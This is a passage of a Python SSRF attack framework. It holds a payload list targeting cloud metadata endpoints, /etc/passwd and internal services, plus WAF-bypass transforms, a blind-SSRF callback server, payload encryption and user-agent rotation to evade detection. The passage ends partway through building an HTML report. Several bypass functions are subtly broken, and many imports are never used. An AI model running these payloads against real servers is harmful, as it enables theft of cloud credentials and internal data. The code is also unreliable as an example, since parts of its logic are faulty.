#!/usr/bin/env python3
import requests
import argparse
import sys
import urllib3
from urllib.parse import urljoin, urlparse, quote
import re
import random
import string
import time
import base64
import json
import csv
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
from datetime import datetime
import os
import socket
import threading
import numpy as np
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.naive_bayes import MultinomialNB
from sklearn.ensemble import RandomForestClassifier
from sklearn.neural_network import MLPClassifier
import pickle
import dnslib
from dnslib.server import DNSServer
from http.server import HTTPServer, BaseHTTPRequestHandler
import uuid
import hashlib
from cryptography.fernet import Fernet
import jinja2
import plotly.graph_objects as go
import plotly.express as px
from jira import JIRA
import subprocess
from playwright.sync_api import sync_playwright
import gym
from gym import spaces
import torch
import torch.nn as nn
import torch.optim as optim
from torch.distributions import Categorical
import stable_baselines3
from stable_baselines3 import PPO
from stable_baselines3.common.env_util import make_vec_env
import tls_client
import scapy.all as scapy
from scapy.layers.tls.record import TLS
from scapy.layers.tls.handshake import TLSClientHello, TLSServerHello, TLSClientKeyExchange
import pyautogui
import asyncio
import aiohttp
import aiofiles
from celery import Celery
from celery.result import AsyncResult
import redis
import networkx as nx
from scrapy.crawler import CrawlerProcess
from scrapy.http import Request
from scrapy.spiders import CrawlSpider, Rule
from scrapy.linkextractors import LinkExtractor
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report, accuracy_score
from sklearn.preprocessing import LabelEncoder
import joblib
from sklearn.svm import SVC
from sklearn.linear_model import LogisticRegression
from sklearn.tree import DecisionTreeClassifier
from sklearn.ensemble import GradientBoostingClassifier
from sklearn.neighbors import KNeighborsClassifier
from sklearn.gaussian_process import GaussianProcessClassifier
from sklearn.gaussian_process.kernels import RBF
from sklearn.discriminant_analysis import QuadraticDiscriminantAnalysis
from sklearn.ensemble import AdaBoostClassifier
from sklearn.naive_bayes import GaussianNB
from sklearn.discriminant_analysis import LinearDiscriminantAnalysis

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Celery('ssrf_framework', broker='redis://localhost:6379/0', backend='redis://localhost:6379/1')

app.conf.update(
    task_serializer='json',
    result_serializer='json',
    accept_content=['json'],
    timezone='UTC',
    enable_utc=True,
    task_track_started=True,
    task_time_limit=30 * 60,
    task_soft_time_limit=25 * 60,
    worker_prefetch_multiplier=1,
    worker_max_tasks_per_child=1000,
)

redis_client = redis.Redis(host='localhost', port=6379, db=2)

class PayloadManager:
    def __init__(self, payload_file=None):
        self.ssrf_payloads = []
        self.waf_bypass_techniques = []
        self.load_payloads(payload_file)
        
    def load_payloads(self, payload_file=None):
        if payload_file and os.path.exists(payload_file):
            try:
                with open(payload_file, 'r') as f:
                    payload_data = json.load(f)
                    self.ssrf_payloads = payload_data.get('ssrf_payloads', [])
                    self.waf_bypass_techniques = payload_data.get('waf_bypass_techniques', [])
                return
            except Exception as e:
                print(f"[-] Error loading payload file: {e}")
                
        self.ssrf_payloads = [
            "http://127.0.0.1:80",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://100.100.100.200/latest/meta-data/",
            "file:///etc/passwd",
            "dict://127.0.0.1:80/",
            "gopher://127.0.0.1:80/_",
            "ftp://127.0.0.1:21",
            "http://0x7f000001",
            "http://2130706433",
            "http://127.1.1.1",
            "http://0177.0.0.1",
            "http://0x7f.0.0.1",
            "http://127.0.0.1%23@target.com/",
            "http://127.0.0.1:80@target.com/",
            "http://target.com@127.0.0.1:80/",
            "http://[::1]:80",
            "http://localhost",
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:6379",
            "http://127.0.0.1:9200",
            "http://127.0.0.1:5601",
            "http://127.0.0.1:11211",
            "http://127.0.0.1:27017",
            "http://127.0.0.1:5000",
            "http://127.0.0.1:8080",
            "http://127.0.0.1:8443",
            "http://127.0.0.1:8888",
            "http://127.0.0.1:9000",
            "http://127.0.0.1:9090"
        ]
        
        self.waf_bypass_techniques = [
            lambda x: self.url_encode(x),
            lambda x: self.double_url_encode(x),
            lambda x: self.mixed_case(x),
            lambda x: self.add_null_byte(x),
            lambda x: self.add_trailing_dot(x),
            lambda x: self.add_port_bypass(x),
            lambda x: self.ipv6_bypass(x),
            lambda x: self.dns_rebinding(x),
            lambda x: self.base64_encode(x),
            lambda x: self.fragment_bypass(x),
            lambda x: self.crlf_injection(x),
            lambda x: self.add_comment(x),
            lambda x: self.add_whitespace(x),
            lambda x: self.add_fake_param(x),
            lambda x: self.override_headers(x),
            lambda x: self.add_path_traversal(x),
            lambda x: self.add_protocol_smuggle(x),
            lambda x: self.add_encoding_bypass(x),
            lambda x: self.add_random_param(x),
            lambda x: self.add_ipv4_decimal(x),
            lambda x: self.add_ipv4_octal(x),
            lambda x: self.add_ipv4_hex(x),
            lambda x: self.add_dangling_markup(x),
            lambda x: self.add_unicode_escape(x)
        ]
    
    def url_encode(self, payload):
        return quote(payload)
    
    def double_url_encode(self, payload):
        return quote(quote(payload))
    
    def mixed_case(self, payload):
        return ''.join(random.choice([c.upper(), c.lower()]) for c in payload if c.isalpha())
    
    def add_null_byte(self, payload):
        return payload + "%00"
    
    def add_trailing_dot(self, payload):
        if payload.startswith('http://'):
            return payload.replace('http://', 'http://127.0.0.1.')
        return payload
    
    def add_port_bypass(self, payload):
        if payload.startswith('http://127.0.0.1'):
            return payload.replace('http://127.0.0.1', 'http://127.0.0.1:80')
        return payload
    
    def ipv6_bypass(self, payload):
        if '127.0.0.1' in payload:
            return payload.replace('127.0.0.1', '[::1]')
        return payload
    
    def dns_rebinding(self, payload):
        if '127.0.0.1' in payload:
            return payload.replace('127.0.0.1', '1.2.3.4')
        return payload
    
    def base64_encode(self, payload):
        return base64.b64encode(payload.encode()).decode()
    
    def fragment_bypass(self, payload):
        if payload.startswith('http://'):
            return payload + '#'
        return payload
    
    def crlf_injection(self, payload):
        return payload + '%0d%0a'
    
    def add_comment(self, payload):
        if payload.startswith('http://'):
            return payload.replace('http://', 'http://127.0.0.1/*/')
        return payload
    
    def add_whitespace(self, payload):
        if payload.startswith('http://'):
            return payload.replace('http://', 'http:// 127.0.0.1')
        return payload
    
    def add_fake_param(self, payload):
        if payload.startswith('http://'):
            return payload.replace('http://', 'http://127.0.0.1?fake=')
        return payload
    
    def override_headers(self, payload):
        return payload + '%0d%0aX-Forwarded-Host:%20127.0.0.1'
    
    def add_path_traversal(self, payload):
        if 'file://' in payload:
            return payload.replace('file://', 'file://../')
        return payload
    
    def add_protocol_smuggle(self, payload):
        return payload.replace('http://', 'http://127.0.0.1;@')
    
    def add_encoding_bypass(self, payload):
        return payload.replace('127.0.0.1', '%31%32%37%2e%30%2e%30%2e%31')
    
    def add_random_param(self, payload):
        random_param = ''.join(random.choices(string.ascii_lowercase, k=5))
        if payload.startswith('http://'):
            return payload.replace('http://', f'http://127.0.0.1?{random_param}=')
        return payload
    
    def add_ipv4_decimal(self, payload):
        if '127.0.0.1' in payload:
            return payload.replace('127.0.0.1', '2130706433')
        return payload
    
    def add_ipv4_octal(self, payload):
        if '127.0.0.1' in payload:
            return payload.replace('127.0.0.1', '0177.0.0.1')
        return payload
    
    def add_ipv4_hex(self, payload):
        if '127.0.0.1' in payload:
            return payload.replace('127.0.0.1', '0x7f.0x0.0x0.0x1')
        return payload
    
    def add_dangling_markup(self, payload):
        if payload.startswith('http://'):
            return payload.replace('http://', 'http://127.0.0.1"><')
        return payload
    
    def add_unicode_escape(self, payload):
        if '127.0.0.1' in payload:
            return payload.replace('127.0.0.1', '\\u31\\u32\\u37\\u2e\\u30\\u2e\\u30\\u2e\\u31')
        return payload
    
    def generate_waf_bypass_payloads(self, original_payload):
        bypass_payloads = [original_payload]
        for technique in self.waf_bypass_techniques:
            try:
                bypass_payloads.append(technique(original_payload))
            except Exception as e:
                continue
        return bypass_payloads

class AdaptivePayloadGenerator:
    def __init__(self, successful_payloads):
        self.successful_payloads = successful_payloads
        
    def generate_variants(self, base_payload):
        variants = []
        
        variants.append(''.join(random.choice([c.upper(), c.lower()]) for c in base_payload if c.isalpha()))
        
        random_param = ''.join(random.choices(string.ascii_lowercase, k=5))
        if '?' in base_payload:
            variants.append(base_payload.replace('?', f'?{random_param}=&'))
        else:
            variants.append(f"{base_payload}?{random_param}=")
        
        if 'http://' in base_payload or 'https://' in base_payload:
            url_parts = base_payload.split('/')
            if len(url_parts) > 3:
                random_segment = ''.join(random.choices(string.ascii_lowercase, k=5))
                url_parts.insert(3, random_segment)
                variants.append('/'.join(url_parts))
        
        if '#' not in base_payload:
            variants.append(f"{base_payload}#{''.join(random.choices(string.ascii_lowercase, k=8))}")
        
        if '?' in base_payload and '&' in base_payload:
            random_param = ''.join(random.choices(string.ascii_lowercase, k=5))
            variants.append(f"{base_payload}&{random_param}=")
        
        return variants

class BehaviorAnalyzer:
    def __init__(self, request_handler):
        self.request_handler = request_handler
        self.baseline_response_time = None
        self.baseline_response_size = None
        
    def establish_baseline(self, url, param):
        try:
            baseline_payload = "http://example.com"
            
            if param in url:
                test_url = url.replace(f"{param}=test", f"{param}={baseline_payload}")
                response = self.request_handler.get(test_url, allow_redirects=False)
            else:
                data = {param: baseline_payload}
                response = self.request_handler.post(url, data=data, allow_redirects=False)
            
            if response:
                self.baseline_response_time = response.elapsed.total_seconds()
                self.baseline_response_size = len(response.content)
                return True
            return False
        except Exception as e:
            return False
    
    def analyze_response(self, response):
        if not response or not self.baseline_response_time or not self.baseline_response_size:
            return {
                "time_anomaly": False,
                "size_anomaly": False,
                "time_score": 0,
                "size_score": 0
            }
        
        response_time = response.elapsed.total_seconds()
        response_size = len(response.content)
        
        time_z_score = abs(response_time - self.baseline_response_time) / 1.0
        size_z_score = abs(response_size - self.baseline_response_size) / 1000.0
        
        time_anomaly = time_z_score > 2.0
        size_anomaly = size_z_score > 2.0
        
        time_score = min(100, int(time_z_score * 20))
        size_score = min(100, int(size_z_score * 20))
        
        return {
            "time_anomaly": time_anomaly,
            "size_anomaly": size_anomaly,
            "time_score": time_score,
            "size_score": size_score
        }

class CallbackServer:
    def __init__(self):
        self.dns_callbacks = set()
        self.http_callbacks = set()
        self.running = False
        
    def start_dns_server(self, port=53):
        class DNSHandler:
            def __init__(self, callback_server):
                self.callback_server = callback_server
                
            def handle(self, request, handler):
                request = dnslib.DNSRecord.parse(request)
                qname = str(request.q.qname)
                
                if qname.endswith('.callback.example.com'):
                    self.callback_server.dns_callbacks.add(qname)
                    
                reply = request.reply()
                return reply
        
        handler = DNSHandler(self)
        dns_server = DNSServer(port, handler)
        
        def run_server():
            try:
                dns_server.start()
            except Exception as e:
                pass
        
        dns_thread = threading.Thread(target=run_server)
        dns_thread.daemon = True
        dns_thread.start()
        
        return dns_thread
    
    def start_http_server(self, port=8080):
        class HTTPHandler(BaseHTTPRequestHandler):
            def __init__(self, callback_server, *args, **kwargs):
                self.callback_server = callback_server
                super().__init__(*args, **kwargs)
                
            def do_GET(self):
                self.callback_server.http_callbacks.add(self.path)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"Callback received")
                
            def log_message(self, format, *args):
                pass
        
        def handler(*args, **kwargs):
            return HTTPHandler(self, *args, **kwargs)
        
        http_server = HTTPServer(('0.0.0.0', port), handler)
        
        def run_server():
            try:
                http_server.serve_forever()
            except Exception as e:
                pass
        
        http_thread = threading.Thread(target=run_server)
        http_thread.daemon = True
        http_thread.start()
        
        return http_thread
    
    def start(self):
        self.running = True
        self.dns_thread = self.start_dns_server()
        self.http_thread = self.start_http_server()
        return self
    
    def stop(self):
        self.running = False
        
    def get_dns_callbacks(self):
        return list(self.dns_callbacks)
    
    def get_http_callbacks(self):
        return list(self.http_callbacks)
    
    def clear_callbacks(self):
        self.dns_callbacks.clear()
        self.http_callbacks.clear()

class BlindSSRFDetector:
    def __init__(self, callback_server):
        self.callback_server = callback_server
        self.dns_domain = "callback.example.com"
        self.http_callback_url = "http://callback.example.com:8080"
        
    def generate_dns_payload(self):
        unique_id = str(uuid.uuid4())
        return f"http://{unique_id}.{self.dns_domain}"
    
    def generate_http_payload(self):
        unique_id = str(uuid.uuid4())
        return f"{self.http_callback_url}/{unique_id}"
    
    def check_dns_callback(self, payload, timeout=30):
        unique_id = payload.split('.')[0].replace('http://', '')
        
        start_time = time.time()
        while time.time() - start_time < timeout:
            callbacks = self.callback_server.get_dns_callbacks()
            for callback in callbacks:
                if unique_id in callback:
                    return True
            time.sleep(1)
            
        return False
    
    def check_http_callback(self, payload, timeout=30):
        unique_id = payload.split('/')[-1]
        
        start_time = time.time()
        while time.time() - start_time < timeout:
            callbacks = self.callback_server.get_http_callbacks()
            for callback in callbacks:
                if unique_id in callback:
                    return True
            time.sleep(1)
            
        return False

class MLModelManager:
    def __init__(self, model_path=None):
        self.models = {
            'naive_bayes': MultinomialNB(),
            'random_forest': RandomForestClassifier(n_estimators=100, random_state=42),
            'mlp': MLPClassifier(hidden_layer_sizes=(100, 50), max_iter=500, random_state=42),
            'svm': SVC(probability=True, random_state=42),
            'logistic_regression': LogisticRegression(max_iter=1000, random_state=42),
            'decision_tree': DecisionTreeClassifier(random_state=42),
            'gradient_boosting': GradientBoostingClassifier(random_state=42),
            'knn': KNeighborsClassifier(n_neighbors=5),
            'gaussian_process': GaussianProcessClassifier(kernel=1.0 * RBF(1.0), random_state=42),
            'ada_boost': AdaBoostClassifier(random_state=42),
            'gaussian_nb': GaussianNB(),
            'quadratic_discriminant': QuadraticDiscriminantAnalysis(),
            'linear_discriminant': LinearDiscriminantAnalysis()
        }
        
        self.vectorizer = TfidfVectorizer(max_features=1000)
        self.label_encoder = LabelEncoder()
        self.trained_models = {}
        self.model_path = model_path or "models/ssrf_ml_models.pkl"
        
        # Create models directory if it doesn't exist
        os.makedirs(os.path.dirname(self.model_path), exist_ok=True)
        
        # Load models if they exist
        if os.path.exists(self.model_path):
            self.load_models()
        else:
            # Train initial models with sample data
            self.train_initial_models()
    
    def train_initial_models(self):
        # Sample training data
        normal_responses = [
            "Welcome to our website",
            "Page not found",
            "Please log in to continue",
            "The requested resource was not found",
            "An error occurred while processing your request",
            "Home page",
            "Contact us",
            "About our company",
            "Terms of service",
            "Privacy policy"
        ]
        
        ssrf_responses = [
            "ami-id: ami-0123456789abcdef0",
            "instance-id: i-0123456789abcdef0",
            "root:x:0:0:root:/root:/bin/bash",
            "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
            "bin:x:2:2:bin:/bin:/usr/sbin/nologin",
            "Welcome to nginx!",
            "Apache/2.4.41 (Ubuntu) Server at localhost Port 80",
            "HTTP/1.1 200 OK",
            "Server: Microsoft-IIS/10.0",
            "AWS metadata",
            "GCP metadata",
            "Azure metadata",
            "Cloud credentials"
        ]
        
        error_responses = [
            "Connection refused",
            "Could not resolve host",
            "Name resolution failed",
            "Connection timed out",
            "No route to host",
            "Internal server error",
            "Bad request",
            "Unauthorized access",
            "Forbidden",
            "Service unavailable"
        ]
        
        # Create labels
        X = normal_responses + ssrf_responses + error_responses
        y = ['normal'] * len(normal_responses) + ['ssrf'] * len(ssrf_responses) + ['error'] * len(error_responses)
        
        # Vectorize and encode labels
        X_vec = self.vectorizer.fit_transform(X)
        y_encoded = self.label_encoder.fit_transform(y)
        
        # Train all models
        for name, model in self.models.items():
            try:
                model.fit(X_vec, y_encoded)
                self.trained_models[name] = model
            except Exception as e:
                print(f"[-] Error training {name} model: {e}")
        
        # Save models
        self.save_models()
    
    def predict(self, response_text):
        if not response_text:
            # Return equal probabilities for all classes if no response text
            classes = self.label_encoder.classes_
            return {cls: 1.0 / len(classes) for cls in classes}
            
        X_vec = self.vectorizer.transform([response_text])
        
        # Get predictions from all models
        all_predictions = {}
        for name, model in self.trained_models.items():
            try:
                probabilities = model.predict_proba(X_vec)[0]
                for i, cls in enumerate(self.label_encoder.classes_):
                    if cls not in all_predictions:
                        all_predictions[cls] = []
                    all_predictions[cls].append(probabilities[i])
            except Exception as e:
                continue
        
        # Average the predictions from all models
        result = {}
        for cls in all_predictions:
            if all_predictions[cls]:
                result[cls] = float(sum(all_predictions[cls]) / len(all_predictions[cls]))
            else:
                result[cls] = 0.0
        
        # Normalize to ensure probabilities sum to 1
        total = sum(result.values())
        if total > 0:
            for cls in result:
                result[cls] /= total
        
        return result
    
    def save_models(self):
        model_data = {
            'vectorizer': self.vectorizer,
            'label_encoder': self.label_encoder,
            'trained_models': self.trained_models
        }
        
        with open(self.model_path, 'wb') as f:
            pickle.dump(model_data, f)
    
    def load_models(self):
        with open(self.model_path, 'rb') as f:
            model_data = pickle.load(f)
            
        self.vectorizer = model_data['vectorizer']
        self.label_encoder = model_data['label_encoder']
        self.trained_models = model_data['trained_models']
    
    def retrain_with_new_data(self, X_new, y_new):
        # Convert new data to features
        X_new_vec = self.vectorizer.transform(X_new)
        y_new_encoded = self.label_encoder.transform(y_new)
        
        # Retrain all models with new data
        for name, model in self.trained_models.items():
            try:
                model.fit(X_new_vec, y_new_encoded)
            except Exception as e:
                print(f"[-] Error retraining {name} model: {e}")
        
        # Save updated models
        self.save_models()
    
    def evaluate_models(self, X_test, y_test):
        X_test_vec = self.vectorizer.transform(X_test)
        y_test_encoded = self.label_encoder.transform(y_test)
        
        results = {}
        
        for name, model in self.trained_models.items():
            try:
                y_pred = model.predict(X_test_vec)
                accuracy = accuracy_score(y_test_encoded, y_pred)
                report = classification_report(y_test_encoded, y_pred, output_dict=True)
                
                results[name] = {
                    'accuracy': accuracy,
                    'classification_report': report
                }
            except Exception as e:
                print(f"[-] Error evaluating {name} model: {e}")
        
        return results

class HumanSimulator:
    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        self.current_ua_index = 0
        self.session = requests.Session()
        
    def get_random_delay(self, mean=1.0, std_dev=0.5):
        delay = np.random.normal(mean, std_dev)
        return max(0.1, delay)
    
    def get_next_user_agent(self):
        if random.randint(1, 5) <= 1:
            self.current_ua_index = (self.current_ua_index + 1) % len(self.user_agents)
        return self.user_agents[self.current_ua_index]
    
    def get_session(self):
        return self.session

class TrafficObfuscator:
    def __init__(self, encryption_key=None):
        if encryption_key:
            self.cipher = Fernet(encryption_key)
        else:
            self.cipher = Fernet(Fernet.generate_key())
    
    def encrypt_payload(self, payload):
        encrypted = self.cipher.encrypt(payload.encode())
        return base64.b64encode(encrypted).decode()
    
    def decrypt_payload(self, encrypted_payload):
        decoded = base64.b64decode(encrypted_payload)
        return self.cipher.decrypt(decoded).decode()
    
    def split_payload(self, payload, max_length=100):
        if len(payload) <= max_length:
            return [payload]
            
        chunks = []
        for i in range(0, len(payload), max_length):
            chunks.append(payload[i:i+max_length])
            
        return chunks
    
    def generate_reassembly_code(self, chunks, param_name):
        chunk_vars = []
        for i, chunk in enumerate(chunks):
            chunk_vars.append(f"var chunk{i} = '{chunk}';")
            
        reassembly_code = ";".join(chunk_vars) + f";var {param_name} = "
        reassembly_code += "+".join([f"chunk{i}" for i in range(len(chunks))]) + ";"
        
        return reassembly_code

class InteractiveHTMLReporter:
    def __init__(self, results, target_url, detected_os):
        self.results = results
        self.target_url = target_url
        self.detected_os = detected_os
        
    def generate_report(self):
        template_str = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SSRF Scan Report</title>
    <script src="https://cdn.plot.ly/plotly-latest.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        h1, h2, h3 {
            color: #333;
        }
        .header {
            border-bottom: 1px solid #ddd;
            padding-bottom: 10px;
            margin-bottom: 20px;
        }
        .summary {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        .summary-card {
            background-color: #f9f9f9;
            padding: 15px;
            border-radius: 5px;
            flex: 1;
            margin-right: 10px;
        }
        .summary-card:last-child {
            margin-right: 0;
        }
        .chart-container {
            margin-bottom: 30px;
            height: 400px;
        }
        .vulnerability {
            border: 1px solid #ddd;
            border-radius: 5px;
            padding: 15px;
            margin-bottom: 20px;
        }
        .vulnerability.high {
            border-left: 5px solid #d9534f;
        }
        .vulnerability.medium {
            border-left: 5px solid #f0ad4e;
        }
        .vulnerability.low {
            border-left: 5px solid #5bc0de;
        }
        .vulnerability-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
        }
        .vulnerability-title {
            font-weight: bold;
        }
        .vulnerability-confidence {
            background-color: #f9f9f9;
            padding: 3px 8px;
            border-radius: 3px;
        }
        .vulnerability-details {
            margin-top: 10px;
        }
        .evidence {
            margin-top: 10px;
            padding-left: 20px;
        }
        .evidence li {
            margin-bottom: 5px;
        }
        .filter {
            margin-bottom: 20px;
        }
        .filter select {
            padding: 8px;
            border-radius: 3px;
            border: 1px solid #ddd;
        }
        .tabs {
            display: flex;
            margin-bottom: 20px;
            border-bottom: 1px solid #ddd;
        }
        .tab {
            padding: 10px 15px;
            cursor: pointer;
            border-bottom: 2px solid transparent;
        }
        .tab.active {
            border-bottom: 2px solid #337ab7;
            font-weight: bold;
        }
        .tab-content {
            display: none;
        }
        .tab-content.active {
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>SSRF Scan Report</h1>
            <p>Target: {{ target_url }}</p>
            <p>Scan Date: {{ scan_date }}</p>
            <p>Detected OS: {{ detected_os }}</p>
        </div>
        
        <div class="summary">
            <div class="summary-card">
                <h3>Total Vulnerabilities</h3>
                <p>{{ total_vulnerabilities }}</p>
            </div>
            <div class="summary-card">
                <h3>High Confidence</h3>
                <p>{{ high_confidence_count }}</p>
            </div>
            <div class="summary-card">
                <h3>Medium Confidence</h3>
                <p>{{ medium_confidence_count }}</p>
            </div>
            <div class="summary-card">
                <h3>Low Confidence</h3>
                <p>{{ low_confidence_count }}</p>
            </div>
        </div>
        
        <div class="tabs">
            <div class="tab active" onclick="showTab('overview')">Overview</div>
            <div class="tab" onclick="showTab('vulnerabilities')">Vulnerabilities</div>
            <div class="tab" onclick="showTab('charts')">Charts</div>
        </div>
        
        <div id="overview" class="tab-content active">
            <h2>Overview</h2>
            <div id="confidence-chart" class="chart-container"></div>
            <div id="endpoint-chart" class="chart-container"></div>
        </div>
        
        <div id="vulnerabilities" class="tab-content">
            <h2>Vulnerabilities</h2>
            <div class="filter">
                <label for="confidence-filter">Filter by Confidence:</label>
                <select id="confidence-filter" onchange="filterVulnerabilities()">
                    <option value="all">All</option>
                    <option value="high">High (>=70%)</option>
                    <option value="medium">Medium (40-69%)</option>
                    <option value="low">Low (<40%)</option>
                </select>
            </div>
            
            <div id="vulnerabilities-list">
                {% for vuln in vulnerabilities %}
                <div class="vulnerability {{ vuln.severity }}" data-confidence="{{ vuln.confidence }}">
                    <div class="vulnerability-header">
                        <div class="vulnerability-title">{{ vuln.url }} - {{ vuln.parameter }}</div>
                        <div class="vulnerability-confidence">{{ vuln.confidence }}%</div>
                    </div>
                    <div class="vulnerability-details">
                        <p><strong>Payload:</strong> {{ vuln.payload }}</p>
                        <p><strong>Status Code:</strong> {{ vuln.status_code }}</p>
                        <p><strong>OS Detected:</strong> {{ vuln.os_detected }}</p>
                        <div class="evidence">
                            <strong>Evidence:</strong>
                            <ul>
                                {% for evidence in vuln.evidence %}
                                <li>{{ evidence }}</li>
                                {% endfor %}
                            </ul>
                        </div>
                    </div>
                </div>
                {% endfor %}
            </div>
        </div>
        
        <div id="charts" class="tab-content">
            <h2>Charts</h2>
            <div id="os-chart" class="chart-container"></div>
            <div id="payload-chart" class="chart-container"></div>
        </div>
    </div>
    
    <script>
        function showTab(tabName) {
            var tabContents = document.getElementsByClassName('tab-content');
            for (var i = 0; i < tabContents.length; i++) {
                tabContents[i].classList.remove('active');
            }
            
            var tabs = document.getElementsByClassName('tab');
            for (var i = 0; i < tabs.length; i++) {
                tabs[i].classList.remove('active');
            }
            
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');
        }
        
        function filterVulnerabilities() {
            var filterValue = document.getElementById('confidence-filter').value;
            var vulnerabilities = document.getElementsByClassName('vulnerability');
            
            for (var i = 0; i < vulnerabilities.length; i++) {
                var confidence = parseInt(vulnerabilities[i].getAttribute('data-confidence'));
                
                if (filterValue === 'all') {
                    vulnerabilities[i].style.display = 'block';
                } else if (filterValue === 'high' && confidence >= 70) {
                    vulnerabilities[i].style.display = 'block';
                } else if (filterValue === 'medium' && confidence >= 40 && confidence < 70) {
                    vulnerabilities[i].style.display = 'block';
                } else if (filterValue === 'low' && confidence < 40) {
                    vulnerabilities[i].style.display = 'block';
                } else {
                    vulnerabilities[i].style.display = 'none';
                }
            }
        }
        
        var confidenceData = [
            {% for vuln in vulnerabilities %}
            {
                x: '{{ vuln.url }}',
                y: {{ vuln.confidence }},
                name: '{{ vuln.parameter }}'
            },
            {% endfor %}
        ];
        
        var endpointData = [
            {% for endpoint in endpoints %}
            {
                x: '{{ endpoint.url }}',
                y: {{ endpoint.vulnerability_count }},
                name: '{{ endpoint.url }}'
            },
            {% endfor %}
        ];
        
        var osData = [
            {% for os, count in os_stats.items() %}
            {
                x: '{{ os }}',
                y: {{ count }},
                name: '{{ os }}'
            },
            {% endfor %}
        ];
        
        var payloadData = [
            {% for payload, count in payload_stats.items() %}
            {
                x: '{{ payload }}',
                y: {{ count }},
                name: '{{ payload }}'
            },
            {% endfor %}
        ];
        
        var confidenceTrace = {
            x: confidenceData.map(item => item.x),
            y: confidenceData.map(item => item.y),
            text: confidenceData.map(item => item.name),
            type: 'bar',
            marker: {
                color: confidenceData.map(item => {
                    if (item.y >= 70) return 'rgb(217, 83, 79)';
                    if (item.y >= 40) return 'rgb(240, 173, 78)';
                    return 'rgb(91, 192, 222)';
                })
            }
        };
        
        var confidenceLayout = {
            title: 'Vulnerability Confidence by URL',
            xaxis: {
                title: 'URL',
                tickangle: -45
            },
            yaxis: {
                title: 'Confidence (%)'
            },
            margin: {
                b: 100
            }
        };
        
        Plotly.newPlot('confidence-chart', [confidenceTrace], confidenceLayout);
        
        var endpointTrace = {
            x: endpointData.map(item => item.x),
            y: endpointData.map(item => item.y),
            type: 'bar'
        };
        
        var endpointLayout = {
            title: 'Vulnerabilities by Endpoint',
            xaxis: {
                title: 'Endpoint',
                tickangle: -45
            },
            yaxis: {
                title: 'Vulnerability Count'
            },
            margin: {
                b: 100
            }
        };
        
        Plotly.newPlot('endpoint-chart', [endpointTrace], endpointLayout);
        
        var osTrace = {
            labels: osData.map(item => item.x),
            values: osData.map(item => item.y),
            type: 'pie'
        };
        
        var osLayout = {
            title: 'Detected Operating Systems'
        };
        
        Plotly.newPlot('os-chart', [osTrace], osLayout);
        
        var payloadTrace = {
            x: payloadData.map(item => item.x),
            y: payloadData.map(item => item.y),
            type: 'bar'
        };
        
        var payloadLayout = {
            title: 'Successful Payload Types',
            xaxis: {
                title: 'Payload Type',
                tickangle: -45
            },
            yaxis: {
                title: 'Success Count'
            },
            margin: {
                b: 100
            }
        };
        
        Plotly.newPlot('payload-chart', [payloadTrace], payloadLayout);
    </script>
</body>
</html>
        """
        
        scan_date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        total_vulnerabilities = len(self.results)
        
        high_confidence_count = len([r for r in self.results if r['confidence'] >= 70])
        medium_confidence_count = len([r for r in self.results if 40 <= r['confidence'] < 70])
        low_confidence_count = len([r for r in self.results if r['confidence'] < 40])
        
        for vuln in self.results:
            if vuln['confidence'] >= 70:
                vuln['severity'] = 'high'
            elif vuln['confidence'] >= 40:
                vuln['severity'] = 'medium'
            else:
                vuln['severity'] = 'low'
        
        endpoint_stats = {}
        for vuln in self.results:
            url = vuln['url']
            if url not in endpoint_stats:
                endpoint_stats[url] = {
                    'url': url,
                    'vulnerability_count': 0
                }
            endpoint_stats[url]['vulnerability_count'] += 1
        
        endpoints = list(endpoint_stats.values())
        
        os_stats = {}
        for vuln in self.results:
            os = vuln['os_detected']
            if os not in os_stats:
                os_stats[os] = 0
            os_stats[os] += 1
        
        payload_stats = {}
        for vuln in self.results:
            payload_type = 'Unknown'
            if '169.254.169.254' in vuln['payload']:
                payload_type = 'AWS Metadata'
            elif 'metadata.google.internal' in vuln['payload']:
                payload_type = 'GCP Metadata'
            elif 'file://' in vuln['payload']:
                payload_type = 'File Access'
            elif '127.0.0.1' in vuln['payload']:
                payload_type = 'Localhost'
            elif 'localhost' in vuln['payload']:
                payload_type = 'Localhost'
            else:
                payload_type = 'Other'
                
            if payload_type not in payload_stats:
                payload_stats[payload_type] = 0
            payload_stats[payload_type] += 1
        
        template = jinja2.Template(template_str)
        html_content = template.render(
            target_url=self.target_url,
            scan_date=scan_date,
            detected_os=self.detected_os,
            total_vulnerabilities=total_vulnerabilities,
            high_confidence_count=high_confidence_count,
            medium_confidence_count=medium_confidence_count,
            low_confidence_count=low_confidence_count,
            vulnerabilities=self.results,
